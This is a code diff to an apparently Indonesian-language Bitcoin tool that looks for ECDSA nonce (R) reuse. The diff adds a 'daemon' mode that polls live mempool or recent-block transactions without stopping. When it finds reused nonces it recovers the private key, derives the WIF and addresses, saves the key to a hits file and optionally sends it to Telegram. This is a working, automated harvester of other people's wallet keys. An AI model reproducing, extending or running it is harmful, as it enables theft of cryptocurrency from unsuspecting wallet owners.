@@ -1074,27 +1074,27 @@ function toWIF(d, prefix = 0x80, compressed = true) {
 // Mode manual: analisis langsung dari R, S, Z, [pubkey]
 // ============================================================
 async function analyzeManual(items) {
-  console.log(c(C.bold, "\n=== Analisis Manual (R, S, Z) ==="));
+  console.log();
+  header("Analisis Manual R / S / Z", items.length + " signature akan dianalisis");
   const sigs = items.map((it, i) => {
     const r = BigInt("0x" + it.r.replace(/^0x/, ""));
     const s = BigInt("0x" + it.s.replace(/^0x/, ""));
     const z = BigInt("0x" + it.z.replace(/^0x/, ""));
     let pubHex = it.pubkey || null;
-    let pubHash = null,
-      addr = null;
+    let pubHash = null, addr = null;
     if (pubHex) {
       const pb = hexToBytes(pubHex);
       pubHash = bytesToHex(hash160(pb));
       addr = p2pkhAddress(hash160(pb));
     }
-    sep(`Sig #${i}`);
-    console.log("R :", c(C.yellow, padHex(r)));
-    console.log("S :", c(C.yellow, padHex(s)));
-    console.log("Z :", c(C.yellow, padHex(z)));
+    sep("Signature #" + i);
+    kv("R", padHex(r), C.yellow);
+    kv("S", padHex(s), C.yellow);
+    kv("Z", padHex(z), C.yellow);
     if (pubHex) {
-      console.log("Public Key :", c(C.magenta, pubHex));
-      console.log("PubKey Hash:", c(C.magenta, pubHash));
-      console.log("Address    :", c(C.green, addr));
+      kv("Public Key", pubHex, C.magenta);
+      kv("PubKey Hash", pubHash, C.magenta);
+      kv("Address", addr, C.green);
     }
     return { index: i, r, s, z, pubkey: pubHex, pubkeyHash: pubHash, address: addr };
   });
@@ -1852,6 +1852,8 @@ function help() {
   row("node index.js batch <file>",              "Scan banyak address dari file");
   row("node index.js explore",                   "Scan tx langsung dari explorer");
   sub("--mode mempool|blocks    --limit <n>  (default: mempool, 100 tx)");
+  row("node index.js daemon",                    "Scan otomatis loop (alert jika R-reuse)");
+  sub("--mode mempool|blocks  --interval <dtk>  --limit <n/siklus>");
   row("node index.js tx <hex>",                  "Analisis raw hex transaksi");
   row("node index.js tx-file <path>",            "Analisis raw hex dari file");
   row("node index.js sig --r <h> --s <h> --z <h>", "Analisis 1 signature manual");
@@ -1903,7 +1905,7 @@ function help() {
 }
 
 const rawArgv = process.argv.slice(2);
-const FLAG_KEYS_WITH_VALUE = new Set(["api", "out", "hits", "concurrency", "amount", "mode", "limit", "date"]);
+const FLAG_KEYS_WITH_VALUE = new Set(["api", "out", "hits", "concurrency", "amount", "mode", "limit", "date", "interval"]);
 const posArgs = [];
 for (let i = 0; i < rawArgv.length; i++) {
   const a = rawArgv[i];
@@ -1962,6 +1964,7 @@ async function interactiveMenu() {
     menuItem("1", ICON.scan,   "Scan Address",    "Semua tx dari 1 wallet, cari R-reuse");
     menuItem("2", ICON.search, "Analisis TXID",   "1 transaksi via TXID");
     menuItem("9", ICON.btc,    "Scan Explorer",   "Langsung dari mempool / blok terbaru");
+    menuItem("D", "⚡",        "Daemon Auto-Scan","Loop terus, alert real-time jika hit");
     menuItem("8", ICON.file,   "Batch Scan File", "Daftar address, 1 per baris");
     menuBot();
 
@@ -1981,7 +1984,7 @@ async function interactiveMenu() {
 
     console.log();
     const choice = (await ask(
-      "  " + c(C.yellow + C.bold, ICON.arrow + " Pilihan [0-9]: ")
+      "  " + c(C.yellow + C.bold, ICON.arrow + " Pilihan [0-9 / D]: ")
     )).trim();
 
     if (choice === "0" || choice === "") { rl.close(); return; }
@@ -2063,6 +2066,30 @@ async function interactiveMenu() {
         hitsFile: CONFIG.hitsFile,
         mode,
         limit,
+      });
+    } else if (choice === "D" || choice === "d") {
+      console.log();
+      console.log(c(C.gray, "  ┌─ ") + c(C.bold + C.yellow, "⚡ DAEMON AUTO-SCAN") + c(C.gray, " ────────────────────────────────────────────┐"));
+      console.log(c(C.gray, "  │") + " " + c(C.yellow + C.bold, "1") + "  " + ICON.scan + "  " + c(C.bold + C.white, "Mempool") +
+        c(C.dim, "      Unconfirmed txs (real-time)") + c(C.gray, "                │"));
+      console.log(c(C.gray, "  │") + " " + c(C.yellow + C.bold, "2") + "  " + ICON.btc  + "  " + c(C.bold + C.white, "Blok Terbaru") +
+        c(C.dim, "  Confirmed txs") + c(C.gray, "                              │"));
+      console.log(c(C.gray, "  └" + "─".repeat(W - 4) + "┘"));
+      console.log();
+      const dsrc = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Sumber [1/2, default 1]       : "))).trim() || "1";
+      const dmode = dsrc === "2" ? "blocks" : "mempool";
+      const dIntervalStr = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Interval detik [default 60]   : "))).trim();
+      const dLimitStr    = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Maks TX/siklus [default 200]  : "))).trim();
+      const dInterval = dIntervalStr ? Math.max(10, parseInt(dIntervalStr, 10) || 60) : 60;
+      const dLimit    = dLimitStr    ? Math.max(1,  parseInt(dLimitStr,    10) || 200) : 200;
+      rl.close();
+      await runDaemon({
+        api:         CONFIG.api || DEFAULT_API,
+        concurrency: CONFIG.concurrency,
+        hitsFile:    CONFIG.hitsFile,
+        mode:        dmode,
+        interval:    dInterval,
+        limit:       dLimit,
       });
     } else {
       rl.close();
@@ -2148,44 +2175,262 @@ function showStats(logPath, dateFilter) {
   const totalDur = scans.reduce((s, x) => s + x.durasi, 0);
   const avgDur = scans.length ? (totalDur / scans.length) : 0;
 
-  console.log();
-  console.log(c(C.bold, "Total per level"));
+  sep("Distribusi Level Log");
   for (const lvl of ["SCAN", "HIT", "RETRY", "WARN", "ERROR"]) {
     const n = byLevel[lvl] || 0;
     const col = lvl === "HIT" ? C.green : lvl === "ERROR" ? C.red : lvl === "WARN" ? C.yellow : lvl === "RETRY" ? C.cyan : C.bold;
-    console.log("  " + c(col, lvl.padEnd(7)) + " " + n);
+    kv(lvl, String(n), col);
   }
 
   console.log();
-  console.log(c(C.bold, "Aktivitas scan"));
-  kv("Scan selesai", String(scans.length), C.bold);
-  kv("Total tx diproses", totalTx.toLocaleString("id-ID"), C.cyan);
-  kv("Total signature", totalSigs.toLocaleString("id-ID"), C.cyan);
-  kv("Total durasi", totalDur.toFixed(1) + " dtk (" + (totalDur / 60).toFixed(1) + " mnt)", C.dim);
-  kv("Rata-rata durasi", avgDur.toFixed(1) + " dtk/scan", C.dim);
+  sep("Aktivitas Scan");
+  kv("Scan selesai",    String(scans.length),                         C.white);
+  kv("Total tx",        totalTx.toLocaleString("id-ID"),              C.cyan);
+  kv("Total signature", totalSigs.toLocaleString("id-ID"),            C.cyan);
+  kv("Total durasi",    totalDur.toFixed(1) + " dtk / " + (totalDur / 60).toFixed(1) + " mnt", C.dim);
+  kv("Rata-rata",       avgDur.toFixed(1) + " dtk/scan",              C.dim);
 
   if (hits.length > 0) {
     console.log();
-    console.log(c(C.green + C.bold, "PRIVATE KEY DIPULIHKAN: " + hits.length));
+    sep("Private Key Dipulihkan (" + hits.length + ")");
     for (const h of hits.slice(-10)) {
-      console.log(c(C.dim, "  " + h.date + " " + h.time + "  ") + h.msg);
+      console.log("  " + ICON.key + " " + c(C.dim, h.date + " " + h.time + "  ") + c(C.green, h.msg));
     }
-    if (hits.length > 10) console.log(c(C.dim, "  ... (" + (hits.length - 10) + " hit lebih lama)"));
+    if (hits.length > 10) console.log(c(C.dim, "  … (" + (hits.length - 10) + " hit lebih lama)"));
   }
 
   const topRetry = Object.entries(retryByAddr).sort((a, b) => b[1] - a[1]).slice(0, 10);
   if (topRetry.length > 0) {
     console.log();
-    console.log(c(C.bold, "Top 10 sumber retry"));
-    for (const [k, v] of topRetry) console.log("  " + String(v).padStart(5) + "  " + c(C.cyan, k));
+    sep("Top 10 Sumber Retry");
+    for (const [k, v] of topRetry) console.log("  " + c(C.cyan, String(v).padStart(5)) + "  " + c(C.dim, k));
   }
 
   const topErr = Object.entries(errorByAddr).sort((a, b) => b[1] - a[1]).slice(0, 10);
   if (topErr.length > 0) {
     console.log();
-    console.log(c(C.bold, "Top 10 sumber error"));
-    for (const [k, v] of topErr) console.log("  " + String(v).padStart(5) + "  " + c(C.red, k));
+    sep("Top 10 Sumber Error");
+    for (const [k, v] of topErr) console.log("  " + c(C.red, String(v).padStart(5)) + "  " + c(C.dim, k));
   }
+  console.log();
+}
+
+// ============================================================
+// Daemon: scan otomatis berkelanjutan (mempool/blok, loop)
+// ============================================================
+async function runDaemon(opts = {}) {
+  const base        = opts.api || DEFAULT_API;
+  const mode        = opts.mode || "mempool";
+  const limitPerCycle = Math.max(1, opts.limit || 200);
+  const intervalSec = Math.max(10, opts.interval || 60);
+  const hitsFile    = opts.hitsFile || CONFIG.hitsFile;
+  const concurrency = opts.concurrency || CONFIG.concurrency;
+
+  const seenTxids = new Set();    // hindari proses tx yang sama dua kali
+  const sigPool   = [];           // akumulasi signature lintas siklus
+  let cycle = 0, totalTx = 0, totalSigs = 0, totalHits = 0;
+  let running = true;
+
+  process.on("SIGINT",  () => { running = false; });
+  process.on("SIGTERM", () => { running = false; });
+
+  console.log();
+  banner();
+  console.log();
+  header(
+    "Mode Daemon — Scan Otomatis Berkelanjutan",
+    "Tekan Ctrl+C untuk berhenti"
+  );
+  kv("Sumber",    mode === "mempool" ? "Mempool (unconfirmed)" : "Blok terbaru", C.cyan);
+  kv("Interval",  intervalSec + " detik per siklus", C.white);
+  kv("Maks TX",   limitPerCycle + " tx per siklus", C.white);
+  kv("Paralel",   concurrency + " request", C.dim);
+  kv("API",       base, C.dim);
+  kv("Hits file", hitsFile, C.dim);
+  console.log();
+  sep("Daemon dimulai · " + new Date().toLocaleString("id-ID"));
+  console.log();
+
+  while (running) {
+    cycle++;
+    const cycleStart = Date.now();
+
+    // ---- Ambil txids baru ----
+    let freshTxids = [];
+    try {
+      if (mode === "mempool") {
+        const all = await esploraFetch(base, "/mempool/txids");
+        if (Array.isArray(all)) freshTxids = all.filter((id) => !seenTxids.has(id)).slice(0, limitPerCycle);
+      } else {
+        const blocks = await esploraFetch(base, "/blocks");
+        for (const blk of (blocks || [])) {
+          if (freshTxids.length >= limitPerCycle) break;
+          try {
+            const tids = await esploraFetch(base, "/block/" + blk.id + "/txids");
+            for (const id of tids) {
+              if (!seenTxids.has(id)) freshTxids.push(id);
+              if (freshTxids.length >= limitPerCycle) break;
+            }
+          } catch {}
+        }
+      }
+    } catch (e) {
+      console.log("  " + ICON.err + " " + c(C.red, "Siklus " + cycle + " gagal ambil txids: " + e.message));
+      await sleep(intervalSec * 1000);
+      continue;
+    }
+
+    if (freshTxids.length === 0) {
+      console.log("  " + ICON.info + c(C.dim, " Siklus " + cycle + " — tidak ada tx baru, tunggu " + intervalSec + "s…"));
+      await sleep(intervalSec * 1000);
+      continue;
+    }
+
+    process.stdout.write(
+      c(C.yellow + C.bold, "  ❯ Siklus #" + cycle) +
+      c(C.dim, "  " + freshTxids.length + " tx baru  ·  pool=" + sigPool.length + " sig  ·  " + new Date().toLocaleTimeString("id-ID")) + "\n"
+    );
+
+    // ---- Ambil metadata ----
+    const metas = [];
+    await runWithConcurrency(freshTxids, concurrency, async (txid) => {
+      try { metas.push(await esploraFetch(base, "/tx/" + txid)); } catch {}
+    }, null);
+
+    // ---- Ekstrak signature ----
+    const cycleSigs = [];
+    await runWithConcurrency(metas, concurrency, async (tx) => {
+      const r = await processTxAllInputs(tx, base);
+      for (const s of r.sigs) cycleSigs.push(s);
+    }, null);
+
+    // Tandai semua txid siklus ini sebagai sudah dilihat
+    for (const id of freshTxids) seenTxids.add(id);
+
+    totalTx   += freshTxids.length;
+    totalSigs += cycleSigs.length;
+
+    // Tambahkan ke pool global (beri index unik)
+    for (const s of cycleSigs) {
+      s.index = sigPool.length;
+      sigPool.push(s);
+    }
+
+    const elapsed = ((Date.now() - cycleStart) / 1000).toFixed(1);
+    console.log(
+      "    " + ICON.ok + " " + c(C.green, cycleSigs.length + " sig") +
+      c(C.dim, " dari " + metas.length + " tx  (" + elapsed + "s)") +
+      c(C.dim, "  │  total pool: " + sigPool.length + " sig")
+    );
+
+    // ---- Deteksi R-reuse di pool ----
+    if (sigPool.length >= 2) {
+      const groups = new Map();
+      for (const s of sigPool) {
+        const k = padHex(s.r);
+        if (!groups.has(k)) groups.set(k, []);
+        groups.get(k).push(s);
+      }
+      for (const [r, list] of groups) {
+        if (list.length < 2) continue;
+        // Cari pasangan baru (setidaknya 1 dari siklus ini)
+        const freshSet = new Set(cycleSigs.map((s) => s.txid));
+        const hasNew = list.some((s) => freshSet.has(s.txid));
+        if (!hasNew) continue;
+
+        totalHits++;
+        console.log();
+        console.log(c(C.red + C.bold, "  " + ICON.alert + " R-REUSE DITEMUKAN! (siklus #" + cycle + ")"));
+        console.log(c(C.dim, "  R = " + r.slice(0, 32) + "…"));
+        for (const s of list.slice(0, 4)) {
+          console.log(c(C.dim, "    tx " + (s.txid || "?").slice(0, 20) + "…  input#" + s.inputIndex + "  " + (s.address || "")));
+        }
+
+        // Coba pulihkan private key (ambil 2 pertama)
+        const a = list[0], b = list[1];
+        if (a.z != null && b.z != null) {
+          const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
+          for (const { k: kVal, d } of cands) {
+            try {
+              const dHex = padHex(d);
+              const pubC = secp256k1.getPublicKey(hexToBytes(dHex), true);
+              const pubU = secp256k1.getPublicKey(hexToBytes(dHex), false);
+              const pubCHex = bytesToHex(pubC);
+              const pubUHex = bytesToHex(pubU);
+              if (pubCHex === a.pubkey || pubUHex === a.pubkey || pubCHex === b.pubkey || pubUHex === b.pubkey) {
+                const h160 = hash160(pubC);
+                const addrC = p2pkhAddress(h160);
+                const addrS = p2wpkhAddress(h160);
+                const wif   = toWIF(d, 0x80, true);
+                box(ICON.key + "  PRIVATE KEY DIPULIHKAN  (daemon siklus #" + cycle + ")", [
+                  c(C.dim, "Priv (hex)    ") + c(C.green + C.bold, dHex),
+                  c(C.dim, "WIF           ") + c(C.green, wif),
+                  c(C.dim, "Addr P2PKH    ") + c(C.green + C.bold, addrC),
+                  c(C.dim, "Addr P2WPKH   ") + c(C.green + C.bold, addrS),
+                  c(C.dim, "R (nonce)     ") + c(C.yellow, r.slice(0, 32) + "…"),
+                ], C.green);
+
+                // Simpan ke hits file
+                try {
+                  const ts = new Date().toISOString();
+                  const line = [
+                    "=== DAEMON HIT ===",
+                    "Waktu     : " + ts, "Siklus    : #" + cycle,
+                    "Priv (hex): " + dHex, "WIF       : " + wif,
+                    "Addr P2PKH: " + addrC, "Addr bc1  : " + addrS,
+                    "R nonce   : " + r, "",
+                  ].join("\n");
+                  appendFileSync(hitsFile, line);
+                } catch {}
+
+                // Notifikasi Telegram
+                if (CONFIG.telegram.enabled) {
+                  await notifyTelegram([
+                    "🚨 *DAEMON R-REUSE HIT* (siklus #" + cycle + ")",
+                    "Priv: `" + dHex + "`",
+                    "WIF : `" + wif + "`",
+                    "P2PKH: `" + addrC + "`",
+                    "bc1  : `" + addrS + "`",
+                  ].join("\n"));
+                }
+                break;
+              }
+            } catch {}
+          }
+        }
+        console.log();
+      }
+    }
+
+    // ---- Status bar ringkas ----
+    console.log(c(C.gray,
+      "    Total: siklus=" + cycle + "  tx=" + totalTx +
+      "  sig=" + totalSigs + "  hit=" + totalHits +
+      "  pool=" + sigPool.length + "  seen=" + seenTxids.size
+    ));
+
+    // ---- Tunggu interval berikutnya ----
+    if (running) {
+      const waitMsg = "  Menunggu " + intervalSec + "s sampai siklus berikutnya… (Ctrl+C untuk berhenti)";
+      process.stdout.write(c(C.dim, waitMsg));
+      const TICK = 1000;
+      let waited = 0;
+      while (waited < intervalSec * 1000 && running) {
+        await sleep(Math.min(TICK, intervalSec * 1000 - waited));
+        waited += TICK;
+        const rem = Math.max(0, Math.ceil((intervalSec * 1000 - waited) / 1000));
+        process.stdout.write("\r" + c(C.dim, waitMsg.replace("Menunggu " + intervalSec + "s", "Menunggu " + rem + "s ")) + "\x1b[K");
+      }
+      process.stdout.write("\r\x1b[K");
+    }
+  }
+
+  console.log();
+  sep("Daemon dihentikan · " + new Date().toLocaleString("id-ID"));
+  kv("Total siklus", String(cycle), C.white);
+  kv("Total tx",     String(totalTx), C.cyan);
+  kv("Total sig",    String(totalSigs), C.cyan);
+  kv("Total hit",    String(totalHits), totalHits > 0 ? C.green : C.dim);
   console.log();
 }
 
@@ -2259,6 +2504,18 @@ async function main() {
       mode: (mode === "blocks" || mode === "blok") ? "blocks" : "mempool",
       limit: limitVal ? Math.max(1, parseInt(limitVal, 10)) : 100,
       hitsFile: getOpt("hits") || CONFIG.hitsFile,
+      concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : CONFIG.concurrency,
+    });
+  } else if (cmd === "daemon") {
+    const mode = getOpt("mode") || "mempool";
+    const intervalVal = getOpt("interval");
+    const limitVal    = getOpt("limit");
+    await runDaemon({
+      api:         getOpt("api") || CONFIG.api,
+      mode:        (mode === "blocks" || mode === "blok") ? "blocks" : "mempool",
+      interval:    intervalVal ? Math.max(10, parseInt(intervalVal, 10)) : 60,
+      limit:       limitVal    ? Math.max(1,  parseInt(limitVal, 10))    : 200,
+      hitsFile:    getOpt("hits") || CONFIG.hitsFile,
       concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : CONFIG.concurrency,
     });
   } else {
